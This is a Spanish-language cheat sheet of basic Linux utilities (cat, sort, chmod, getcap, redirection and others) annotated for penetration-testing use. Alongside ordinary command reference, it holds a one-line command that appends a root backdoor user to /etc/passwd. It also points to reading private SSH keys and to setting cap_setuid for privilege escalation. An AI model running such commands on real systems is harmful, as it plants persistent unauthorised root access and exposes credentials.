---
aliases:
  - "tail"
  - "ROT13"
  - "xxd"
  - "Hex dump"
  - "7z"
  - "mktemp"
  - "watch"
  - "ls"
  - "tar"
  - "netstat"
  - "ps"
  - "shred"
  - "alias"
  - "readpst"
  - "mdb-tools"
  - cat
  - sort
  - uniq
  - tr
  - more
  - diff
  - chmod
  - echo
  - file
  - strings
  - md5sum
  - mkpasswd
  - getcap
  - dstat
  - dev null
  - "/dev/null"
tags:
  - tool/linux-utils
kind: CheatSheet
linked:
  - "[[grep]]"
  - "[[find]]"
  - "[[awk]]"
  - "[[xargs]]"
---
# Common Linux Utilities

> [!info]
> Cheatsheet de utilidades básicas Linux usadas en pentest workflows. Ver notas dedicadas para [[grep]], [[find]], [[awk]], [[xargs]].

---

## File / text

| Util | Uso típico en pentest |
|---|---|
| `cat <file>` | Mostrar contenido. `cat /etc/passwd`, `cat ~/.ssh/id_rsa` |
| `more` / `less <file>` | Paginar. `less +F log` (tail-like) |
| `head -n N` / `tail -n N` | Primeras/últimas N líneas |
| `tail -f log` | Watch en vivo (log poisoning) |
| `wc -l` | Contar líneas |
| `cut -d':' -f1` | Extract columna por delim. `cut -d: -f1 /etc/passwd` |
| `sort` | Ordenar. `sort -u` (dedup), `sort -n` (numérico), `sort -k2` (col 2) |
| `uniq -c` | Contar duplicados (requiere sort previo) |
| `tr 'a-z' 'A-Z'` | Char replace. `tr -d '\n'` (strip newlines) |
| `diff a b` | Comparar files. `diff -r dir1 dir2` |
| `strings binary` | Print ASCII strings de binario. Hunt credentials |
| `file unknown.bin` | Identify file type (ELF, PE, image, etc.) |
| `xxd` / `hexdump -C` | Hex dump |

---

## Hashing / crypto

| Util | Uso |
|---|---|
| `md5sum file` | MD5 hash file |
| `sha1sum file` / `sha256sum` | Otros hashes |
| `mkpasswd -m sha-512 <pwd>` | Generate Linux shadow hash (para `/etc/shadow` poisoning) |
| `openssl passwd -1 <pwd>` | Generate MD5 crypt |
| `openssl rand -base64 32` | Random string |

```bash
# Add backdoor user via /etc/passwd write
echo "backdoor:$(mkpasswd -m sha-512 Pwn1!):0:0:root:/root:/bin/bash" >> /etc/passwd
```

---

## Permissions / capabilities

| Util | Uso |
|---|---|
| `chmod 600 id_rsa` | Mode read/write owner only |
| `chmod +x exploit.sh` | Make executable |
| `chown user:group file` | Cambiar owner |
| `getcap -r / 2>/dev/null` | Listar capabilities (privesc — cap_setuid en python, etc.) |
| `setcap cap_setuid+ep /tmp/binary` | Set capability |
| `umask` | Default permission mask |

---

## Process / system

| Util | Uso |
|---|---|
| `ps aux \| grep <name>` | Find process |
| `kill -9 <pid>` | Force kill |
| `dstat` | Stats de sys (CPU/disk/net) en tiempo real |
| `top` / `htop` | Process monitor |
| `lsof -i :4444` | Process listening on port |
| `netstat -tlnp` (legacy) / `ss -tlnp` | Listening sockets |

---

## I/O / redirection

| Construct | Uso |
|---|---|
| `cmd > file` | Stdout → file (overwrite) |
| `cmd >> file` | Stdout → file (append) |
| `cmd 2> file` | Stderr → file |
| `cmd > file 2>&1` | Stdout + stderr → file |
| `cmd 2>/dev/null` | Discard stderr |
| `cmd > /dev/null 2>&1` | Discard ambos (silent) |
| `cmd \| tee file` | Stdout → terminal AND file |
| `cmd < file` | File → stdin |

---

## Echo / print

```bash
echo -n 'text'           # Sin newline final (importante para base64 encoding)
echo -e 'a\nb'           # Escape sequences habilitadas
printf '%s\n' "${arr[@]}"  # Print array
```

---

## Notas Relacionadas

- [[grep]]
- [[find]]
- [[awk]]
- [[xargs]]
- [[base64]]
- [[Linux Privilege Escalation]]
